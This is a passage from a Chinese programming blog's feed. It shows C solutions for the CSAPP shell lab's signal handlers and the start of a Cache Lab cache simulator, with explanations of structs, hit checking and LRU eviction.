            <span class="token keyword">return</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span> 
    <span class="token comment" spellcheck="true">// For a PID</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>id<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
        pid_t pid<span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>job<span class="token operator">=</span> <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d): No such process\n"</span><span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  
            <span class="token keyword">return</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  

    <span class="token punctuation">}</span>  

    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: argument must be a PID or %%jobid\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// Continue</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> SIGCONT<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>errno <span class="token operator">!=</span> ESRCH<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"kill error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">// To determine the bg and fg</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"fg"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        job<span class="token operator">-></span>state <span class="token operator">=</span> FG<span class="token punctuation">;</span>
        <span class="token function">waitfg</span><span class="token punctuation">(</span>job<span class="token operator">-></span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"bg"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] (%d) %s"</span><span class="token punctuation">,</span> job<span class="token operator">-></span>jid<span class="token punctuation">,</span> job<span class="token operator">-></span>pid<span class="token punctuation">,</span> job<span class="token operator">-></span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
        job<span class="token operator">-></span>state <span class="token operator">=</span> BG<span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bg/fg error: %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>接下来就是比较麻烦的三个信号handler的处理。</p>
<h4 id="sigint_handler"><a href="#sigint_handler" class="headerlink" title="sigint_handler"></a>sigint_handler</h4><p>sigint_handler是主要的处理，也是比较简单的。它用来捕获键盘的Ctrl-C。当捕获到终止信号，它会查询当前前台执行的job的pid，使用kill来终止程序。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * sigint_handler - The kernel sends a SIGINT to the shell whenver the
 *    user types ctrl-c at the keyboard.  Catch it and send it along
 *    to the foreground job.  
 */</span>
<span class="token keyword">void</span> <span class="token function">sigint_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    pid_t pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> jid <span class="token operator">=</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> SIGKILL<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// kill pid</span>
        <span class="token punctuation">{</span>
            <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"error when kill in sigint_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal %d\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="sigtstp_handler"><a href="#sigtstp_handler" class="headerlink" title="sigtstp_handler"></a>sigtstp_handler</h4><p>同样，sigtstp_handler是捕获Ctrl-Z的挂起信号，通过获取当前前台job的pid，修改其state为ST，接着使用kill挂起进程。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/*
 * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever
 *     the user types ctrl-z at the keyboard. Catch it and suspend the
 *     foreground job by sending it a SIGTSTP.  
 */</span>
<span class="token keyword">void</span> <span class="token function">sigtstp_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token keyword">int</span> jid <span class="token operator">=</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 

        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) Stopped by signal %d\n"</span><span class="token punctuation">,</span> jid<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> sig<span class="token punctuation">)</span><span class="token punctuation">;</span>   
        <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>state <span class="token operator">=</span> ST<span class="token punctuation">;</span>  
        <span class="token function">kill</span><span class="token punctuation">(</span><span class="token operator">-</span>pid<span class="token punctuation">,</span> SIGTSTP<span class="token punctuation">)</span><span class="token punctuation">;</span>  
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h4 id="sigchld_handler"><a href="#sigchld_handler" class="headerlink" title="sigchld_handler"></a>sigchld_handler</h4><p>sigchld_handler是用来捕获 SIGCHLD 信号的，比起其他两个信号处理函数，这个是用来回收进程的，可能会稍微有点麻烦。参考书中8.4.3相关内容，用到了WIFSTOPPED， WIFSIGNALED，WIFEXITED，分别代表判断进程被停止， 被未捕获的信号停止，exit的停止。其实就是回收过程中的僵尸进程的回收，Ctrl-Z、Ctrl-C信号下进程的回收。</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 
 * sigchld_handler - The kernel sends a SIGCHLD to the shell whenever
 *     a child job terminates (becomes a zombie), or stops because it
 *     received a SIGSTOP or SIGTSTP signal. The handler reaps all
 *     available zombie children, but doesn't wait for any other
 *     currently running children to terminate.  
 */</span>
<span class="token keyword">void</span> <span class="token function">sigchld_handler</span><span class="token punctuation">(</span><span class="token keyword">int</span> sig<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> status<span class="token punctuation">;</span>  
    pid_t pid<span class="token punctuation">;</span>  

    <span class="token comment" spellcheck="true">// Waiting for handling all of the child processes according to their status</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">waitpid</span><span class="token punctuation">(</span><span class="token function">fgpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>status<span class="token punctuation">,</span> WNOHANG<span class="token operator">|</span>WUNTRACED<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSTOPPED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token function">getjobpid</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token operator">-></span>state <span class="token operator">=</span> ST<span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[%d] Stopped %s\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> jobs<span class="token operator">-></span>cmdline<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFSIGNALED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Job [%d] (%d) terminated by signal %d\n"</span><span class="token punctuation">,</span> <span class="token function">pid2jid</span><span class="token punctuation">(</span>pid<span class="token punctuation">)</span><span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token function">WTERMSIG</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span>pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>  
        <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WIFEXITED</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  
            <span class="token function">deletejob</span><span class="token punctuation">(</span>jobs<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>  
    <span class="token punctuation">}</span>  

    <span class="token keyword">if</span> <span class="token punctuation">(</span>errno <span class="token operator">!=</span> ECHILD<span class="token punctuation">)</span> <span class="token punctuation">{</span>  
        <span class="token function">unix_error</span><span class="token punctuation">(</span><span class="token string">"waitpid error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
    <span class="token punctuation">}</span>  

    <span class="token keyword">return</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre>
<h4 id="u5176_u4ED6"><a href="#u5176_u4ED6" class="headerlink" title="其他"></a>其他</h4><p>虽然job事务处理没有让我们写，但实验给出的源代码写的很好，很是值得读一读。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CSAPP Lab4 解题分析]]></title>
      <url>http://xinqiu.me/2016/06/07/csapp-lab4-cachelab/</url>
      <content type="html"><![CDATA[<script type="text/x-mathjax-config">
MathJax.Hub.Config({
  tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]}
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<blockquote>
<p>Lab4 的Cache Lab 的说明资料太少了，<code>csim.c</code> 里面空空的，惊了。身为弱渣的我只好先拿别人的代码来参考参考。这里选取的代码<a href="https://github.com/zhoudiqiu/Cache-lab/blob/master/lab4/csim.c" target="_blank" rel="external">csim.c</a>。</p>
</blockquote>
<h2 id="Part_A_3A_Writing_a_Cache_Simulator"><a href="#Part_A_3A_Writing_a_Cache_Simulator" class="headerlink" title="Part A: Writing a Cache Simulator"></a>Part A: Writing a Cache Simulator</h2><p>需要些一个Cache模拟器，将 <code>valgrind</code> 内存访问记录作为参数，模拟是否命中缓存。输出命中，不命中，移除。</p>
<p>lab里提供了一个写好的程序 <code>csim-ref</code> ，使用LRU(least-recently used)替换原则，模拟缓存命中情况。</p>
<p>实验指导上给出了命令行参数</p>
<p><code>Usage: ./csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</code></p>
<ul>
<li><p><code>-h</code>: Optional help flag that prints usage info</p>
</li>
<li><p><code>-v</code>: Optional verbose flag that displays trace info</p>
</li>
<li><p><code>-s &lt;s&gt;</code>: Number of set index bits ($ S = 2^{s} $ is the number of sets) </p>
</li>
<li><p><code>-E &lt;E&gt;</code>: Associativity (number of lines per set)</p>
</li>
<li><p><code>-b &lt;b&gt;</code>: Number of block bits ($ B = 2^{b} $ is the block size)</p>
</li>
<li><p><code>-t &lt;tracefile&gt;</code>: Name of the valgrind trace to replay</p>
</li>
</ul>
<p>所以在 <code>csim.c</code> 里也可以写个打印帮助的函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">printUsage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: ./csim [-h] [-v] -s &lt;s> -E &lt;E> -b &lt;b> -t &lt;tracefile>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-s: number of set index(2^s sets)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-E: number of lines per set\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-b: number of block offset bits\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-t: trace file name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<a id="more"></a>
<p>参考书中对cache的描述，需要些用结构体定义出cache的一些属性</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> s<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2^s sets</span>
    <span class="token keyword">int</span> S<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//S=2^s</span>
    <span class="token keyword">int</span> b<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2^b per block    </span>
    <span class="token keyword">int</span> B<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//B=2^b</span>
    <span class="token keyword">int</span> E<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//number of lines per set</span>
    <span class="token comment" spellcheck="true">//number to track the solution    </span>
    <span class="token keyword">int</span> hitNum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> missNum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> evictionNum<span class="token punctuation">;</span>
    <span class="token keyword">int</span> verbosity<span class="token punctuation">;</span>
<span class="token punctuation">}</span> cacheProperty<span class="token punctuation">;</span>
</code></pre>
<p>对应的说明可以看书中 Figure 6.28.</p>
<p>根据Figure 6.27，cache是一个set的数组，每个set包含一个或者多个行，每个行又包括一个有效位，tag标识位， 数据块。所以可以定义出cache的组成</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> valid<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> tag<span class="token punctuation">;</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>block<span class="token punctuation">;</span>
    <span class="token keyword">int</span> usedCounter<span class="token punctuation">;</span>
<span class="token punctuation">}</span> setLine<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    setLine <span class="token operator">*</span>lines<span class="token punctuation">;</span>
<span class="token punctuation">}</span> cacheSet<span class="token punctuation">;</span>

<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>
    cacheSet <span class="token operator">*</span>sets<span class="token punctuation">;</span>
<span class="token punctuation">}</span> cache<span class="token punctuation">;</span>
</code></pre>
<p>接着就需要考虑cache的初始化。其实就是使用malloc分配内存给定义的cache。一开始所有的有效位和tag标识位都为0。</p>
<pre class=" language-c"><code class="language-c">cache <span class="token function">initiate</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> S<span class="token punctuation">,</span> <span class="token keyword">int</span> E<span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    cache currentCache<span class="token punctuation">;</span>    
    cacheSet set<span class="token punctuation">;</span>
    setLine line<span class="token punctuation">;</span>
    currentCache<span class="token punctuation">.</span>sets <span class="token operator">=</span> <span class="token punctuation">(</span>cacheSet <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>cacheSet<span class="token punctuation">)</span> <span class="token operator">*</span> S<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//loop to construct the set of the cache</span>
    <span class="token keyword">int</span> i<span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> S<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
    <span class="token punctuation">{</span>
        set<span class="token punctuation">.</span>lines <span class="token operator">=</span>  <span class="token punctuation">(</span>setLine <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>setLine<span class="token punctuation">)</span> <span class="token operator">*</span> E<span class="token punctuation">)</span><span class="token punctuation">;</span>
        currentCache<span class="token punctuation">.</span>sets<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> set<span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">//loop to construct the lines</span>
        <span class="token keyword">int</span> j<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> E<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> 
        <span class="token punctuation">{</span>
            line<span class="token punctuation">.</span>valid <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
            line<span class="token punctuation">.</span>tag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
            set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> line<span class="token punctuation">;</span>
            line<span class="token punctuation">.</span>usedCounter <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> 
    <span class="token keyword">return</span> currentCache<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>对于判断是否命中，要判断两个部分，有效位是否设置，cache的line中tag标识位是否匹配。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">checkHit</span><span class="token punctuation">(</span>setLine line<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> tag<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>valid<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>tag <span class="token operator">==</span> tag<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>判断行里是否已经满了。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">checkFull</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>property<span class="token punctuation">.</span>E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当需要缓存时，需要找到一个有效的缓存空间。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">findIndex</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>property<span class="token punctuation">.</span>E<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>valid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">return</span> i<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//shouldn't get a -1 anyway, method only called when there is granted space</span>
    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>当缓存不用了，需要移出这块缓存里的内容。</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">findEvict</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> min <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> property<span class="token punctuation">.</span>E <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>min<span class="token operator">></span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">)</span><span class="token punctuation">{</span>
            index <span class="token operator">=</span> i<span class="token punctuation">;</span>
            min <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> index<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">findMax</span><span class="token punctuation">(</span>cacheSet set<span class="token punctuation">,</span> cacheProperty property<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">int</span> max <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> property<span class="token punctuation">.</span>E <span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token operator">></span>max<span class="token punctuation">)</span><span class="token punctuation">{</span>
            index <span class="token operator">=</span> i<span class="token punctuation">;</span>
            max <span class="token operator">=</span> set<span class="token punctuation">.</span>lines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>usedCounter<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> index<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>接下来最关键的是写一个模拟器，模拟cache操作。首先，按照书中的介绍，tag的数量在64位系统下等于64减去块偏移位数量和组索引位数量。根据tag数量，可以求出组索引。接着将这块cache记录到Cache区中。通过循环遍历一块cache块里的行，查看命中情况。</p>
<p>如果命中，更新cache的属性。如果不命中，并且缓存并没满，那么需要添加新的缓存内容。如果因为缓存满了，那么需要将缓存中最先使用的缓存块移除缓存。</p>
<pre class=" language-c"><code class="language-c">cacheProperty <span class="token function">simulate</span><span class="token punctuation">(</span>cache currentCache<span class="token punctuation">,</span>cacheProperty property<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> address<span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//compute the size of the tag, 64 bit system</span>
    <span class="token keyword">int</span> tagSize <span class="token operator">=</span> <span class="token number">64</span><span class="token operator">-</span><span class="token punctuation">(</span>property<span class="token punctuation">.</span>b <span class="token operator">+</span> property<span class="token punctuation">.</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> tag <span class="token operator">=</span> address <span class="token operator">>></span> <span class="token punctuation">(</span>property<span class="token punctuation">.</span>s <span class="token operator">+</span> property<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">//use the tagSize to compute for the set index</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> temp <span class="token operator">=</span> address <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>tagSize<span class="token punctuation">)</span><span class="token punctuation">;</span>
